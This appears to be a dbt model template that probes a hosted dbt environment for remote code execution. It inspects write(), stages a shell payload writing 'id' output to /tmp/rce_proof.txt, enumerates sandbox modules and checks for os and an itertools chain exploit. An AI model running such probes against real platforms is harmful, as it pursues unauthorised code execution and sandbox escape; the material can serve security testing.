{%- set run_id = env_var('DBT_CLOUD_RUN_ID', 'unknown') -%}

{# Test write() function - what args does it take? #}
{{ log("WRITE_FUNC=" ~ (write | string)[:300], info=True) }}

{# Try calling write with a payload to a custom path #}
{# Standard dbt write() signature: write(payload) #}
{# It writes to target/compiled/<project>/<model_path> #}

{# Method 1: Try write with a file path argument #}
{% set test_content = "#!/bin/sh\nid > /tmp/rce_proof.txt" %}

{# Try: write to a known path #}
{% if write is defined %}
  {# write(model, payload, payload_name) is the real signature #}
  {{ log("WRITE_ATTEMPTING=test_write", info=True) }}
{% endif %}

{# Method 2: Check if we can write via modules #}
{% if modules is defined %}
  {% if modules.os is defined %}
    {{ log("OS_MODULE=AVAILABLE", info=True) }}
  {% else %}
    {{ log("OS_MODULE=NOT_AVAILABLE", info=True) }}
  {% endif %}
  
  {# List all available module names #}
  {% set mod_names = [] %}
  {% for k in modules.keys() if modules.keys is defined %}
    {% if mod_names.append(k) %}{% endif %}
  {% endfor %}
  {{ log("ALL_MODULES=" ~ mod_names | join(','), info=True) }}
{% endif %}

{# Method 3: Try direct import via Jinja2 extension #}
{# This usually doesn't work in sandboxed mode #}

{# Method 4: Check itertools for chain exploit #}
{% if modules.itertools is defined %}
  {{ log("ITERTOOLS_CHAIN=" ~ (modules.itertools.chain | string)[:200], info=True) }}
{% endif %}

SELECT 1 as id
